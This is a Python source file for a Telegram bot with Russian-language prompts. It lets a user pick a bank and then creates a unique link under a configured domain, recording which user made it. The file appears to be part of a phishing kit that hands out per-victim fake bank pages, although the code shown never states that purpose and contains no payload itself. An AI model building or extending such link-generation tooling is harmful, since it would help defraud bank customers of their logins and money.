from aiogram import F, Router, Bot
from aiogram.types import CallbackQuery
from database.db import Database
from keyboards.inline import banks, back
from string import ascii_letters
from random import sample
from config import domain

db = Database()


def create_link_handler():
    router = Router()
    @router.callback_query(F.data == "create_link")
    async def create_link(
        c: CallbackQuery
    ):
        await c.message.edit_text(
            text="<b>📥 Выберите банк</b>",
            reply_markup=banks()
        )

    @router.callback_query(F.data.startswith("bank:"))
    async def choice_bank(
        c: CallbackQuery,
        bot: Bot
    ):
        bank = c.data.split(":")[1]
        hash = "".join(sample(ascii_letters, 10))
        bot_id = (await bot.me()).id
        creator = c.from_user.id
        await db.add_link(
            creator=creator,
            bot_id=bot_id,
            endpoint=hash
        )
        link = f"{domain}/{bank}/{hash}"
        await c.message.edit_text(
            text=f"🌐 Создана ссылка: {link}",
            reply_markup=back()
        )
    return router

    